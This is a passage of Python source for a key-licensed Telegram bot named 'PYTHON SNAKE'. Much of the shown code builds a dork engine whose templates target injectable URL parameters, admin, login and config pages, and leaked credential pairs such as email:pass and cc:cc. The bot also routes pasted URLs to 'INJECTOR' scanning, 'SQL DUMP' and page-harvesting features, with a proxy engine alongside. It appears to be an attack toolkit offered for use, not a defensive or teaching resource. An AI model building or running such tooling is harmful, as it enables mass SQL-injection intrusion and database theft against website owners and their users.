        context.user_data["last_urls"] = clean
        path, cnt = dump_text(clean, "clean_urls", "PYTHON SNAKE — cleaned URLs")
        try:
            await q.edit_message_text(
                H("CLEAN + DEDUPE", "%.0f%% bache" % (len(clean) / max(1, len(items)) * 100)) + "\n\n"
                "📥 Input : <code>%s</code>\n"
                "🧹 Junk  : <code>%s</code>\n"
                "✅ Clean : <code>%s</code>\n\n%s"
                % (fmt(len(items)), fmt(len(items) - len(clean)), fmt(cnt),
                   short_list(clean[:8], 8)),
                parse_mode=ParseMode.HTML, reply_markup=kb_file(kind))
        except Exception:
            pass
        await send_file(update, path, "🧹 %d clean URLs" % cnt)
        return

    if action == "kqual":
        kws = [str(x) for x in items if x]
        qrep = kw_quality(kws)
        body = (H("KEYWORD QUALITY", "avg %.0f/100" % qrep["avg"]) + "\n\n"
                "📦 Total : <code>%s</code>\n\n"
                "🔥 80+   : <code>%s</code>\n"
                "✅ 65-79 : <code>%s</code>\n"
                "🟡 45-64 : <code>%s</code>\n"
                "🟠 25-44 : <code>%s</code>\n"
                "🔴 <25   : <code>%s</code>\n\n"
                "<b>Top 6:</b>\n%s\n"
                "<b>Kamzor 4:</b>\n%s"
                % (fmt(qrep["total"]), fmt(qrep["b80"]), fmt(qrep["b65"]),
                   fmt(qrep["b45"]), fmt(qrep["b25"]), fmt(qrep["b0"]),
                   short_list(qrep["top"][:6], 6), short_list(qrep["worst"][:4], 4)))
        try:
            await q.edit_message_text(body, parse_mode=ParseMode.HTML, reply_markup=kb_file(kind))
        except Exception:
            pass
        hq = [k for k in kws if score_keyword(k)[0] >= 80]
        if hq:
            path, cnt = dump_text(hq, "keywords_hq", "PYTHON SNAKE — HQ only (80+)")
            await send_file(update, path, "🔥 %s HQ keywords (80+)" % fmt(cnt))
        return

    if action == "kexp":
        context.user_data["kw_items"] = items
        cap = kw_capacity(kw_cores(items))
        try:
            await q.edit_message_text(
                (H("EXPAND KEYWORDS", "%s lines" % fmt(len(items))) + "\n\n"
                 "📊 Max : <code>%s</code>\n\n"
                 "Kitne keywords chahiye? <b>Number bhejo</b> (1 – %s)\n"
                 "<i>Recommended: 5,000</i>" % (fmt(min(cap, KW_MAX)), fmt(KW_MAX))),
                parse_mode=ParseMode.HTML, reply_markup=kb_file(kind))
        except Exception:
            pass
        await_set(context, "kw_count")
        return

    if action == "inj":
        await _run_inject(update, context, [x for x in items if x.startswith("http")][:200]
                          or items[:200])
        return


# ═══════════════════════════════════════════════════════════════════════════════
#  🧠 AUTO-DETECT — input kya hai? (keywords / dorks / domains / params / …)
# ═══════════════════════════════════════════════════════════════════════════════
DORK_OP_RE = re.compile(r"\b(inurl|intitle|intext|allinurl|allintitle|inanchor|allintext|"
                        r"site|filetype|ext)\s*:", re.I)
FT_WORDS = {"php", "asp", "aspx", "jsp", "html", "htm", "txt", "sql", "pdf", "xml",
            "json", "js", "bak", "zip", "rar", "env", "log", "conf", "ini", "csv",
            "xls", "xlsx", "doc", "docx", "ppt", "pptx", "sh", "py", "rb", "pl"}
TLD_WORDS = {"com", "net", "org", "ru", "de", "in", "pk", "us", "uk", "info", "gov",
             "io", "co", "fr", "it", "es", "nl", "br", "mx", "au", "ca", "za", "ng",
             "ke", "eg", "sa", "ae", "tr", "ir", "ua", "pl", "se", "no", "dk", "fi",
             "edu", "mil", "biz", "xyz", "top", "shop", "store", "site", "online"}
SF_WORDS = {"inurl:", "intitle:", "allinurl:", "allintitle:", "intext:", "allintext:",
            "inanchor:", "site:", "filetype:", "ext:"}

KIND_LABEL = {
    "keywords": "🔑 KEYWORDS", "dorks": "🎯 DORKS", "urls": "🔗 URLs",
    "domains": "🌐 DOMAINS", "params": "🔢 PARAMETERS", "filetypes": "📄 FILE-TYPES",
    "sfilters": "🔍 SEARCH FILTERS", "pfilters": "📋 PAGE FILTERS",
    "combos": "🧬 COMBOS", "empty": "⚪ KHAALI",
}


def _lines(text) -> list:
    return [x.strip() for x in re.split(r"[\n;|]+", str(text or "")) if x.strip()]


def detect_kind(text, want: str = "") -> str:
    """Input ka asli type pata karo. Priority: dorks > urls > combos > …
       `want` diya ho to usi ke hisaab se strict ho jata hai.
    """
    L = _lines(text)
    if not L:
        return "empty"
    n = len(L)

    def frac(f):
        return f / n

    dorks = sum(1 for x in L if DORK_OP_RE.search(x))
    urls = sum(1 for x in L if x.lower().startswith(("http://", "https://", "www.")))
    doms = 0
    for x in L:
        t = x.lower().lstrip(".")
        if re.fullmatch(r"\.[a-z]{2,8}", x.lower()):
            doms += 1
        elif re.fullmatch(r"[a-z0-9.\-]+\.[a-z]{2,8}/?", t) and t.rsplit(".", 1)[-1].rstrip("/") in TLD_WORDS:
            doms += 1
    fts = 0
    for x in L:
        t = x.lower().lstrip(".")
        if t in FT_WORDS:
            fts += 1
    sfs = sum(1 for x in L if x.lower().strip() in SF_WORDS or
              (x.lower().endswith(":") and x.lower() in SF_WORDS))
    combos = sum(1 for x in L if re.search(r"[a-z0-9._%+\-]+:[^\s:]{3,}", x, re.I)
                 and not DORK_OP_RE.search(x))
    single = sum(1 for x in L if re.fullmatch(r"[a-z_][a-z0-9_]{0,30}", x, re.I))
    multi = sum(1 for x in L if " " in x)

    # strict contexts pehle
    if want == "keywords":
        if frac(dorks) > 0.3:
            return "dorks"
        if frac(urls) > 0.5:
            return "urls"
        return "keywords"
    if want == "dorks":
        if frac(dorks) > 0.2:
            return "dorks"
        if frac(urls) > 0.5:
            return "urls"
        return "keywords"
    if want == "domains":
        return "domains" if frac(doms) > 0.5 else "keywords"
    if want == "params":
        return "params" if frac(single) > 0.6 else "keywords"
    if want == "filetypes":
        return "filetypes" if frac(fts) > 0.5 else "keywords"
    if want == "sfilters":
        return "sfilters" if frac(sfs) > 0.5 else "keywords"
    if want == "pfilters":
        return "pfilters" if frac(single) > 0.5 else "keywords"
    if want == "combos":
        return "combos" if frac(combos) > 0.5 else "keywords"

    # auto
    if frac(dorks) > 0.3:
        return "dorks"
    if frac(urls) > 0.5:
        return "urls"
    if frac(sfs) > 0.5:
        return "sfilters"
    if frac(combos) >= 0.6:
        return "combos"
    if frac(fts) >= 0.6:
        return "filetypes"
    if frac(doms) >= 0.6:
        return "domains"
    if frac(single) >= 0.9 and multi == 0:
        return "params"
    return "keywords"


KIND_HINT = {
    "keywords": "jaise <code>shopify store, crypto wallet</code> (multi-word)",
    "dorks": "jaise <code>inurl:admin.php site:gov.in</code>",
    "urls": "jaise <code>https://site.com/page.php?id=5</code>",
    "domains": "jaise <code>.com .net gov.in</code>",
    "params": "jaise <code>id, cat, page</code> (ek word)",
    "filetypes": "jaise <code>.php .asp .jsp</code>",
    "sfilters": "jaise <code>inurl: intitle:</code>",
    "pfilters": "jaise <code>index, view, login</code>",
    "combos": "jaise <code>email:pass</code>",
}


NUM_ONLY_RE = re.compile(r"^[0-9\s,.;:\-]+$")


def kind_check(text, want: str, ctx_label: str) -> tuple:
    """(ok, error_text). Galat type ho to saaf message."""
    # sirf numbers = keyword nahi (warna "1000" se 800 junk dorks ban jate hain)
    if want == "keywords" and NUM_ONLY_RE.match(str(text or "")):
        return False, (
            "❌ <b>A number alone is not a keyword.</b>\n\n"
            "📥 Aapne bheja: <code>%s</code>\n"
            "✅ Chahiye: asli keywords, jaise <code>shopify store, crypto wallet</code>\n\n"
            "👉 Keywords bhejo (ya ⬅️ BACK dabao)." % esc(str(text)[:40]))
    got = detect_kind(text, want=want)
    if got == want:
        return True, ""
    return False, (
        "❌ <b>These are not %s — send %s.</b>\n\n"
        "📥 Aapne bheja: <b>%s</b>\n"
        "✅ Chahiye   : <b>%s</b> — %s\n\n"
        "👉 Dobara bhejo (ya ⬅️ BACK dabao)."
        % (esc(ctx_label), esc(ctx_label), KIND_LABEL.get(got, got),
           KIND_LABEL.get(want, want), KIND_HINT.get(want, "")))


# ═══════════════════════════════════════════════════════════════════════════════
#  🧩 PRO DORK ENGINE — config + templates + combos
# ═══════════════════════════════════════════════════════════════════════════════
PRO_DEFAULTS = {
    "domains": [".com", ".net", ".org", ".ru", ".de", ".in", ".pk", ".us", ".uk",
                ".info", ".gov"],
    "params": ["id", "user_id", "cat", "type", "page", "item", "product"],
    "filetypes": [".php", ".asp", ".aspx", ".jsp"],
    "sfilters": ["inurl:", "intitle:", "allinurl:", "allintitle:"],
    "pfilters": ["index", "view", "page", "item", "product", "user", "login",
                 "search", "show", "cat"],
    "combos": ["email:pass", "user:pass", "username:password", "api_key:",
               "admin:admin", "root:root", "login:pass", "cc:cc"],
}

# (KW)=keyword (DE)=domain (PF)=page-filter (PT)=param (FT)=filetype
# (SF)=search-filter (NB)=random number (CO)=combo
PRO_TEMPLATES_DEFAULT = [
    "(KW).(PF)?(PT)=",
    "(KW).(PF)?(PT)= site:(DE)",
    "(KW).(PF)?(PT)=(NB)",
    "(KW).(PF)?(PT)=(NB) site:(DE)",
    '(SF)"(KW)" site:(DE)',
    "(SF)(KW).(PF)?(PT)=",
    "(SF)(KW).(PF)?(PT)= site:(DE)",
    "(SF)(PT)=(KW).(PF)? site:(DE)",
    "(SF)(KW).(PF)?(PT)=(NB)",
    "(SF)(KW).(PF)?(PT)=(NB) site:(DE)",
    "(SF)(KW) (FT)",
    "(SF)(KW) (FT) site:(DE)",
    '(SF)"(KW)" (FT)',
    "(SF)(KW)/(PF)",
    "(SF)(KW)/(PF).(FT)",
    "(KW) (CO)",
    '(SF)"(KW)" (CO)',
    "inurl:(KW)/(PF)",
    "intitle:(KW) inurl:(PT)=",
    "(KW).(PF) (FT) site:(DE)",
]

_PRO_CACHE = None
PRO_KEY = ["domains", "params", "filetypes", "sfilters", "pfilters", "combos", "templates"]


def pro_load() -> dict:
    """PRO config (data/pro_config.json) — defaults ke saath merge."""
    global _PRO_CACHE
    if _PRO_CACHE is None:
        raw = jload("pro_config", {}) or {}
        d = {k: list(v) for k, v in PRO_DEFAULTS.items()}
        for k in PRO_KEY:
            if k == "templates":
                continue
            if isinstance(raw.get(k), list) and raw[k]:
                d[k] = raw[k]
        tpls = raw.get("templates")
        if isinstance(tpls, list) and tpls:
            clean = []
            for i, t in enumerate(tpls, 1):
                if isinstance(t, dict) and t.get("tpl"):
                    clean.append({"id": int(t.get("id") or i), "tpl": str(t["tpl"]),
                                  "on": bool(t.get("on", True))})
                elif isinstance(t, str) and t.strip():
                    clean.append({"id": i, "tpl": t.strip(), "on": True})
            if clean:
                d["templates"] = clean
        if not isinstance(d.get("templates"), list):
            d["templates"] = [{"id": i, "tpl": t, "on": True}
                              for i, t in enumerate(PRO_TEMPLATES_DEFAULT, 1)]
        _PRO_CACHE = d
    return _PRO_CACHE


def pro_save(cfg: dict = None) -> None:
    global _PRO_CACHE
    if cfg is not None:
        _PRO_CACHE = cfg
    jsave("pro_config", _PRO_CACHE or pro_load())


def pro_reset() -> None:
    global _PRO_CACHE
    _PRO_CACHE = {k: list(v) for k, v in PRO_DEFAULTS.items()}
    _PRO_CACHE["templates"] = [{"id": i, "tpl": t, "on": True}
                               for i, t in enumerate(PRO_TEMPLATES_DEFAULT, 1)]
    pro_save()


def pro_on_templates(cfg: dict = None) -> list:
    cfg = cfg or pro_load()
    return [t for t in cfg["templates"] if t.get("on")]


def _pick(lst, i=0):
    return lst[i % len(lst)] if lst else ""


def pro_render(tpl: str, kw: str, cfg: dict = None, idx: int = 0) -> str:
    """Ek template ko real dork me badlo."""
    cfg = cfg or pro_load()
    kw = " ".join(str(kw or "").split())[:60]
    # domain — leading dot rakho (site:.gov sahi hai, site:gov galat)
    de = _pick(cfg["domains"], idx)
    pf = _pick(cfg["pfilters"], idx)
    pt = _pick(cfg["params"], idx * 3 + 1)
    ft = _pick(cfg["filetypes"], idx * 2 + 1)
    sf = _pick(cfg["sfilters"], idx)
    nb = str(random.randint(1, 9)) * random.choice([1, 2, 3]) + str(random.randint(0, 99))
    co = _pick(cfg["combos"], idx)
    out = str(tpl)
    # pehle baaki placeholders bharo, KW sabse aakhir me (operator pata chale)
    out = out.replace("(DE)", de)
    out = out.replace("(PF)", pf)
    out = out.replace("(PT)", pt)
    out = out.replace("(FT)", ft.lstrip("."))
    out = out.replace("(SF)", sf)
    out = out.replace("(NB)", nb)
    out = out.replace("(CO)", co)

    # KW ka shape — sabse important quality factor
    pos = out.find("(KW)")
    prev = out[pos - 1] if pos > 0 else ""
    nxt = out[pos + 4] if pos >= 0 and pos + 4 < len(out) else ""
    before = out[:pos] if pos > 0 else ""
    url_op = bool(URL_OP_RE.search(before))           # inurl:/allinurl:/inanchor:
    already_q = (prev == '"' and nxt == '"')          # template me "(KW)" pehle se
    if url_op:
        # URL me space nahi hota → gap hata ke slug (zyada real matches)
        kw_form = kw_slug(kw) or kw
        out = out.replace('"(KW)"', "(KW)")           # inurl:"..." ke quotes hatao
    elif already_q:
        kw_form = kw.replace('"', " ")
    elif prev and prev in ':"':
        kw_form = '"%s"' % kw
    elif " " in kw:
        url_side = ((nxt and nxt in ".-_/?:") or (prev and prev in ".-_/?"))
        if url_side:                                  # path/URL ke andar → slug
            kw_form = kw_slug(kw)
        else:                                         # normal search → quoted phrase
            kw_form = '"%s"' % kw
    else:
        kw_form = kw
    out = out.replace("(KW)", kw_form)
    # ".index" / "?id" jaisa shape theek karo
    # inurl:"shopify-store" → inurl:shopify-store (quotes ki zaroorat nahi)
    out = re.sub(r'(inurl|allinurl|inanchor):"([^"]{1,90})"', r"\1:\2", out)
    out = re.sub(r"(?<![\w:])\." + r"(?=\.)", ".", out)
    out = re.sub(r"\?\.", "?", out)
    out = " ".join(out.split())
    return out.strip()


def pro_gen(keywords, n: int = 1000, mode: str = "all") -> dict:
    """PRO dorks banao — enabled templates × keywords.

    mode: "all" (sab templates) | "best" (keyword ke liye best template)
    """
    cfg = pro_load()
    kws = kw_cores(keywords, limit=2000) if isinstance(keywords, (list, tuple, str)) else []
    kws = kws or ["admin"]
    n = max(1, min(DORK_MAX, int(n or 1000)))
    tpls = pro_on_templates(cfg)
    if not tpls:
        return {"dorks": [], "used": 0, "tpls": 0, "kw": len(kws)}
    out, seen, used = [], set(), defaultdict(int)
    order = tpls if mode != "best" else (tpls[:1] + tpls[1:])

    def add(x):
        x = " ".join(str(x).split())
        if not x or len(x) > 200 or x in seen:
            return False
        seen.add(x)
        out.append(x)
        return True

    # round-robin: har keyword × har template
    i = 0
    stall = 0
    while len(out) < n and stall < len(kws) * len(order) + 200:
        before = len(out)
        kw = kws[i % len(kws)]
        t = order[(i // len(kws)) % len(order)]
        add(pro_render(t["tpl"], kw, cfg, idx=i))
        used[t["id"]] += 1 if len(out) > before else 0
        if len(out) == before:
            stall += 1
        else:
            stall = 0
        i += 1
    dorks = _dork_finish(out, n)
    return {"dorks": dorks, "used": len(used), "tpls": len(order), "kw": len(kws)}


def pro_best_templates(keyword: str, cfg: dict = None, top: int = 4) -> list:
    """Is keyword ke liye sabse achhi templates (score se)."""
    cfg = cfg or pro_load()
    scored = []
    for t in pro_on_templates(cfg):
        try:
            d = pro_render(t["tpl"], keyword, cfg, idx=0)
        except Exception:
            continue
        sc = score_dork(d)[0]
        scored.append((sc, t))
    scored.sort(key=lambda z: -z[0])
    return [t for _, t in scored[:max(1, top)]]


def pro_gen_best(keywords, n: int = 1000) -> dict:
    """Har keyword ke liye uski BEST templates chuno, phir dorks banao."""
    cfg = pro_load()
    kws = kw_cores(keywords, limit=2000) or ["admin"]
    n = max(1, min(DORK_MAX, int(n or 1000)))
    out, seen, used = [], set(), set()
    plan = []
    for kw in kws:
        for t in pro_best_templates(kw, cfg, top=4):
            plan.append((kw, t))

    def add(x):
        x = " ".join(str(x).split())
        if not x or len(x) > 200 or x in seen:
            return False
        seen.add(x)
        out.append(x)
        return True

    i, stall = 0, 0
    while len(out) < n and stall < len(plan) * 2 + 100:
        before = len(out)
        kw, t = plan[i % len(plan)]
        add(pro_render(t["tpl"], kw, cfg, idx=i))
        if len(out) > before:
            used.add(t["id"])
        stall = stall + 1 if len(out) == before else 0
        i += 1
    return {"dorks": _dork_finish(out, n), "used": len(used),
            "tpls": len({t["id"] for _, t in plan}), "kw": len(kws)}


# NORMAL gen — curated PRO-style templates (har niche pe kaam karti hain)
UNIVERSAL_TEMPLATES = [
    'intitle:"(KW)"', 'allintitle:"(KW)"',
    'intext:"(KW)"', 'allintext:"(KW)"',
    'inurl:"(KW)"', 'allinurl:"(KW)"',
    '"(KW)" inurl:index', '"(KW)" inurl:login', '"(KW)" inurl:admin',
    '"(KW)" inurl:upload', '"(KW)" inurl:dashboard', '"(KW)" inurl:search',
    'intitle:"(KW)" inurl:(PT)=', 'intext:"(KW)" inurl:(PT)=', 'inurl:"(KW)" inurl:(PT)=',
    '"(KW)" ext:(FT)', '"(KW)" filetype:(FT)', 'intitle:"(KW)" ext:(FT)',
    '(SF)intitle:"(KW)" ext:(FT)',
    'intitle:"(KW)" site:(DE)', 'inurl:"(KW)" site:(DE)', '"(KW)" site:(DE)',
    '"(KW)" inurl:{PF}', 'intitle:"(KW)" inurl:(PF)', 'intext:"(KW)" inurl:(PF)',
    '(SF)"(KW)" (CO)', 'inurl:(CO)',
    '"(KW)" inurl:api', '"(KW)" inurl:config', '"(KW)" inurl:backup',
    '"(KW)" inurl:panel', '"(KW)" inurl:portal', '"(KW)" inurl:register',
    '"(KW)" (PT)=(NB)', 'intitle:"(KW)" (PT)=(NB)', 'inurl:"(KW)" (PT)=(NB)',
    '"(KW)" (PT)= inurl:(PF)',
    '"(KW)" -site:github.com', '"(KW)" -inurl:blog',
    'intitle:"index of" "(KW)"', '"(KW)" filetype:(FT) site:(DE)',
]


def universal_gen(keywords, n: int = 1000, fresh: bool = False) -> list:
    """NORMAL gen — universal curated templates (koi config nahi chahiye)."""
    cfg = pro_load()
    kws = kw_cores(keywords, limit=2000) or ["admin"]
    n = max(1, min(DORK_MAX, int(n or 1000)))
    hist = dork_seen() if fresh else set()
    out, seen = [], set()
    tpls = UNIVERSAL_TEMPLATES

    def add(x):
        x = " ".join(str(x).split())
        if not x or len(x) > 200 or x in seen:
            return False
        if hist and dork_hash(x) in hist:
            return False
        seen.add(x)
        out.append(x)
        return True

    i, stall = 0, 0
    limit_iter = n * 8 + 2000
    while len(out) < n and stall < limit_iter and i < limit_iter:
        before = len(out)
        nk = len(kws)
        kw = kws[i % nk]
        t = tpls[(i // nk) % len(tpls)]
        add(pro_render(t, kw, cfg, idx=i))
        stall = stall + 1 if len(out) == before else 0
        i += 1
    return _dork_finish(out, n)


# ═══════════════════════════════════════════════════════════════════════════════
#  🚧 FEATURE GATE — admin koi bhi button band kar sakta hai + custom message
# ═══════════════════════════════════════════════════════════════════════════════
FEATURES = OrderedDict([
    ("parse", ("🔍 PARSER", ["m:parse", "pr:"])),
    ("dork", ("🎯 DORKER", ["m:dork", "dd:", "dp:"])),
    ("kw", ("🔑 HQ KEYWORDS", ["m:kw", "kw:"])),
    ("rev", ("🔗 URL REVERSE", ["m:rev", "rv:"])),
    ("inj", ("💉 INJECTOR", ["m:inj", "inj:"])),
    ("dump", ("📦 DUMPER", ["m:dump", "df:"])),
    ("proxy", ("🧅 PROXY ENGINE", ["m:proxy", "px:"])),
    ("qa", ("📊 QUALITY CHECK", ["m:qa", "qa:"])),
    ("rand", ("🎲 RANDOMIZER", ["m:rand", "rd:"])),
    ("theme", ("🎨 THEME", ["m:theme", "th:set:"])),
    ("file", ("📂 FILE UPLOAD", ["f:"])),
    ("redeem", ("🔑 REDEEM", ["m:redeem"])),
])

DEFAULT_OFF_MSG = ("🚧 <b>%s</b>\n\n"
                   "This feature is under <b>maintenance</b>.\n"
                   "Try again in a little while — the team is fixing it. 🙏")


def feat_off() -> dict:
    v = SETTINGS.get("feat_off")
    return v if isinstance(v, dict) else {}


def feat_is_off(key: str) -> bool:
    return key in feat_off()


def feat_msg(key: str) -> str:
    off = feat_off()
    label = FEATURES.get(key, (key, []))[0]
    custom = str(off.get(key) or "").strip()
    if custom:
        return "🚧 <b>%s</b>\n\n%s" % (label, esc(custom))
    return DEFAULT_OFF_MSG % label


def feat_gate(data: str) -> str:
    """callback_data dekho — koi feature band hai kya?"""
    if not data or data.startswith(("m:home", "m:help", "m:redeem", "a:", "cap:")):
        return ""
    for key, (_label, prefixes) in FEATURES.items():
        if not feat_is_off(key):
            continue
        for p in prefixes:
            if data == p or data.startswith(p):
                return key
    return ""


def feat_set(key: str, off: bool, message: str = "") -> None:
    d = dict(feat_off())
    if off:
        d[key] = message or ""
    else:
        d.pop(key, None)
    SETTINGS["feat_off"] = d
    jsave("settings", SETTINGS)


def feat_kb() -> InlineKeyboardMarkup:
    rows = []
    for key, (label, _p) in FEATURES.items():
        mk = "🚫" if feat_is_off(key) else "✅"
        rows.append([InlineKeyboardButton("%s %s" % (mk, label), callback_data="a:feat:" + key),
                     InlineKeyboardButton("✏️ MSG", callback_data="a:featmsg:" + key)])
    rows.append([InlineKeyboardButton("✅ ALL ON", callback_data="a:featall:1"),
                 InlineKeyboardButton("⬅️ BACK", callback_data="a:home")])
    return RK(rows)


# ═══════════════════════════════════════════════════════════════════════════════
#  NICHE PACKS — ready packs hata diye. Sirf user ke apne niches (nc:add)
# ═══════════════════════════════════════════════════════════════════════════════
NICHE_PACKS = OrderedDict()          # legacy naam — khaali (packs hata diye)


def niche_seeds(key: str) -> list:
    """Legacy helper — ab khaali (ready packs nahi hain)."""
    return []


# ═══════════════════════════════════════════════════════════════════════════════
#  TEXT ROUTER
# ═══════════════════════════════════════════════════════════════════════════════
AWAIT_HANDLERS = {
    "dork_count": input_dork_count,
    "gen_count": None,
    "gen_kw": None,
    "dpgen_count": None,
    "dpgen_kw": None,
    "pro_combo": None,
    "pro_domains": None,
    "pro_params": None,
    "pro_filetypes": None,
    "pro_sfilters": None,
    "pro_pfilters": None,
    "a_tut": None,
    "feat_msg": None,
    "qa_keywords": None,
    "qa_dorks": None,
    "qa_urls": None,
    "kw_input": input_kw_input,
    "kw_count": input_kw_count,
    "rev_urls": input_rev_urls,
    "rev_vuln": input_rev_vuln,
    "inj_urls": input_inj_urls,
    "dump_urls": input_dump_urls,
    "harvest_urls": input_harvest_urls,
    "parse_dorks": input_parse_dorks,
    "parse_max": input_parse_max,
    "rand_items": input_rand,
    "key_redeem": None,
    "bc_text": None,
    "deep_max": None,
}


async def on_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = (update.message.text or "").strip()
    if not is_verified(context, uid):
        q, kb = captcha_new(context)
        await update.message.reply_text(q, reply_markup=kb, parse_mode=ParseMode.HTML)
        return

    # 🪄 Premium (animated) emoji detect — admin koi message forward kare to ID mil jati hai
    if is_admin(uid):
        try:
            ents = list(getattr(update.message, "entities", None) or [])
            found = []
            for e in ents:
                if str(getattr(e, "type", "")) != "custom_emoji":
                    continue
                cid = getattr(e, "custom_emoji_id", "")
                if not cid:
                    continue
                # Telegram offset/length UTF-16 me hote hain (emoji 2 units)
                try:
                    _b = text.encode("utf-16-le")
                    ce = _b[e.offset * 2:(e.offset + e.length) * 2].decode("utf-16-le", "ignore")
                except Exception:
                    ce = ""
                found.append((str(cid), ce or "🎨"))
        except Exception:
            found = []
        if found:
            cid, ce = found[0]
            context.user_data["se_id"] = str(cid)
            context.user_data["se_emoji"] = ce
            rows, row = [], []
            for sl in SE_SLOTS:
                row.append(InlineKeyboardButton(emo_btn(sl) + " " + SE_LABEL[sl].title(),
                                               callback_data="se:set:" + sl))
                if len(row) == 2:
                    rows.append(row)
                    row = []
            if row:
                rows.append(row)
            rows.append([InlineKeyboardButton("🗑 REMOVE KARO", callback_data="se:set:off")])
            more = ("\n<b>%d</b> emoji mile — pehla liya. Doosra chahiye to sirf wahi "
                    "emoji wala message forward karo." % len(found)) if len(found) > 1 else ""
            await update.message.reply_text(
                (H("PREMIUM EMOJI DETECTED", "ID: %s" % cid, slot="admin") + "\n\n"
                 + "◆ %s\n\n" % ce
                 + P("Kis button me lagana hai? <b>Neeche tap karo</b> — animated ho jayega.")
                 + more), parse_mode=ParseMode.HTML, reply_markup=RK(rows),
                disable_web_page_preview=True)
            return

    # 🔑 REDEEM pehle — access gate se PEHLE, warna key type hi nahi ho sakti
    wait = await_get(context)
    if wait == "key_redeem":
        await_clear(context)
        context.user_data.pop("await_admin", None)
        return await input_redeem(update, context, text)
    up = text.upper()
    if not access_ok(uid) and (KEY_RE.match(up) or up in KEYS):
        await_clear(context)
        return await input_redeem(update, context, up)

    if not access_ok(uid):
        await update.message.reply_text(need_key_text(uid), parse_mode=ParseMode.HTML,
                                        reply_markup=kb_needkey())
        return
    if context.user_data.get("await_admin") and not is_admin(uid):
        await_clear(context)
        return
    fn = AWAIT_HANDLERS.get(wait)
    if fn:
        await_clear(context)
        return await fn(update, context, text)
    # ── smart fallback: URL / dork / keywords paste kiya ho to kaam suggest karo ──
    urls = _urls_from_text(text, 500)
    dorkish = len([l for l in text.splitlines() if DORK_OP.search(l)])
    if urls:
        rows = [[InlineKeyboardButton("💉 SCAN %d URL(s)" % min(len(urls), 200),
                                      callback_data="inj:paste")],
                [InlineKeyboardButton("📥 SQL DUMP these", callback_data="df:paste")],
                [InlineKeyboardButton("🕸 PAGE HARVEST these", callback_data="df:hpaste")]]
        context.user_data["paste_urls"] = urls[:2000]
        await update.message.reply_text(
            (H("URLs DETECTED", "%s found" % fmt(len(urls))) + "\n\n"
             + P("What do you want to do with them?") + "\n\n"
             + "\n".join("<code>%s</code>" % esc(u[:90]) for u in urls[:4])
             + ("\n<i>+ %d more…</i>" % (len(urls) - 4) if len(urls) > 4 else "")),
            parse_mode=ParseMode.HTML, reply_markup=RK(rows))
        return
    if dorkish:
        context.user_data["paste_dorks"] = [l.strip() for l in text.splitlines() if l.strip()][:2000]
        await update.message.reply_text(
            (H("DORKS DETECTED", "%s lines" % fmt(dorkish)) + "\n\n"
             + P("Run the parser on these?")),
            parse_mode=ParseMode.HTML,
            reply_markup=RK([[InlineKeyboardButton("🚀 PARSE THESE DORKS",
                                                  callback_data="pr:paste")],
                             [InlineKeyboardButton("🏠 MENU", callback_data="m:home")]]))
        return
    await update.message.reply_text(
        "🤔 <b>That didn't match any step.</b>\n\n"
        "You can send me:\n"
        "• <b>URLs</b> — scan or dump them\n"
        "• <b>Dorks</b> — parse them into URLs\n"
        "• <b>Keywords / seeds</b> — build HQ keywords\n"
        "• <b>a file</b> (.txt .csv .json .xlsx)\n\n"
        "Or pick a tool:",
        parse_mode=ParseMode.HTML, reply_markup=kb_main())

TOOL_HANDLERS = {
    "dork": tool_dork,
    "kw": tool_kw,
    "rev": tool_rev,
    "inj": tool_inj,
    "parse": tool_parse,
    "proxy": tool_proxy,
    "qa": tool_qa,
    "rand": tool_rand,
    "dump": tool_dump,
}


# ═══════════════════════════════════════════════════════════════════════════════
#  REDEEM KEY
# ═══════════════════════════════════════════════════════════════════════════════
def redeem_key(uid, key: str) -> tuple:
    key = (key or "").strip().upper()
    rec = KEYS.get(key)
    if not rec:
        return False, "❌ Key not found."
    if rec.get("used_by") and str(rec["used_by"]) != str(uid):
        return False, "❌ That key has already been used."
    days = int(rec.get("days") or 0)
    u = USERS.setdefault(str(uid), {})
    base = datetime.now()
    try:
        cur = datetime.fromisoformat(u.get("expires") or "")
        if cur > base:
            base = cur
    except Exception:
        pass
    u["expires"] = (base + timedelta(days=days)).isoformat(timespec="seconds")
    rec["used_by"] = str(uid)
    rec["used_at"] = datetime.now().isoformat(timespec="seconds")
    USERS[str(uid)] = u
    save_all()
    return True, ("✅ Key redeemed!\n📅 +%d days\n⏳ Valid till <b>%s</b>"
                  % (days, esc(u["expires"][:16].replace("T", " "))))


TOOL_HANDLERS["redeem"] = lambda *a, **k: tool_redeem(*a, **k)


def tool_redeem_text() -> str:
    return (H("REDEEM KEY", "3 ways") + "\n\n"
            "1️⃣ <b>Send the key below</b> (button flow)\n"
            "2️⃣ <code>/redeem SNK-AB12-CD34</code>\n"
            "3️⃣ Just <b>paste</b> the key — it redeems itself\n\n"
            "Format: <code>SNK-XXXX-XXXX</code>\n"
            "No key yet? Owner: %s" % ADMIN_USERNAME)


async def tool_redeem(update, context):
    q = update.callback_query
    try:
        await q.edit_message_text(tool_redeem_text(), reply_markup=kb_back("m:home"),
                                  parse_mode=ParseMode.HTML)
    except Exception:
        pass
    await_set(context, "key_redeem")


AWAIT_HANDLERS["key_redeem"] = lambda *a, **k: input_redeem(*a, **k)


async def input_redeem(update, context, text: str):
    uid = update.effective_user.id
    key = (text or "").strip().upper()
    if not key:
        await update.effective_message.reply_text(
            "❌ Key is empty. Format: <code>SNK-AB12-CD34</code>", parse_mode=ParseMode.HTML)
        return
    ok, msg = redeem_key(uid, key)
    if ok:
        await update.effective_message.reply_text(msg, parse_mode=ParseMode.HTML)
        await show_home(update, uid, edit=False)
        return
    hint = ""
    if not KEY_RE.match(key):
        hint = "\n\n📌 Format: <code>SNK-XXXX-XXXX</code> (with dashes)"
    await update.effective_message.reply_text(
        msg + hint, parse_mode=ParseMode.HTML, reply_markup=kb_needkey())


# ── /redeem command (key ke bina bhi kaam karta hai) ─────────────────────────
async def cmd_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_verified(context, uid):
        q, kb = captcha_new(context)
        await update.effective_message.reply_text(q, reply_markup=kb, parse_mode=ParseMode.HTML)
        return
    arg = (" ".join(getattr(context, "args", []) or [])).strip()
    if arg:
        return await input_redeem(update, context, arg)
    await_set(context, "key_redeem")
    await update.effective_message.reply_text(tool_redeem_text(),
                                              reply_markup=kb_back("m:home"),
                                              parse_mode=ParseMode.HTML)


# ═══════════════════════════════════════════════════════════════════════════════
#  ADMIN PANEL
# ═══════════════════════════════════════════════════════════════════════════════
def kb_admin() -> InlineKeyboardMarkup:
    return RK([
